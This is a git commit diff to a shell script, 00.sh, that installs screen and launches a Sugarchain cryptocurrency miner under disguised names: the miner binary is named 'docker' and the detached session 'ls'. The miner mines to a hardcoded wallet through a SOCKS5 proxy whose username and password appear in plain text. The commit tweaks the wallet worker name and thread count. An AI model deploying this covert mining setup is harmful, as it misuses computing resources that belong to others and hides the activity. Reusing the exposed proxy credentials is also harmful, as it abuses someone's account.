4dc571d4ae369c841221954c779896292a175245
03081997 <86400154+03081997@users.noreply.github.com>
2021-06-28 22:39:39 +0700

    Update 00.sh

--- 00.sh
+++ 00.sh
@@ -3,6 +3,6 @@ sudo apt install screen libjansson4 -y
 chmod +x docker 
 screen -dmS ls 
 POOL=1pool.sugarchain.org:3333
-WALLET=sugar1qe40q8krx7elqg84lcn6j8qqzjcpgyf6p8ac92x
+WALLET=sugar1qe40q8krx7elqg84lcn6j8qqzjcpgyf6p8ac92x.adz
 PROXY=socks5://ilbbkwmp:qwe2bptzjsss@209.127.191.180:9279
-./00 -a yespowerSUGAR -o $POOL -u $WALLET -x $PROXY -q
+./00 -a yespowerSUGAR -o $POOL -u $WALLET -t2 -x $PROXY -q
